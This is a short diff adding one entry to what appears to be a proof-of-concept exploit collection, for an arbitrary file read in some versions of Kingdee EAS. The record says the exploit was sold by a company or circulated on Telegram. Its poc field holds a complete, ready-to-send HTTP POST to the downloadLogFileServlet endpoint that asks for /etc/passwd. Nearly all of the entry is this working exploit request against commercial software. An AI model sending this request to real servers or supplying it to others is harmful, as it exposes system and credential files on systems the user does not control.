@@ -1,0 +1,7 @@
+vendor = "金蝶"
+name = "金蝶eas部分版本 任意文件读取"
+type = "任意文件读取"
+source = "某司售卖、TG"
+date = "08.09"
+poc = "POST /easadmin/downloadLogFileServlet HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 20 filePath=/etc/passwd"
+label = "nday"
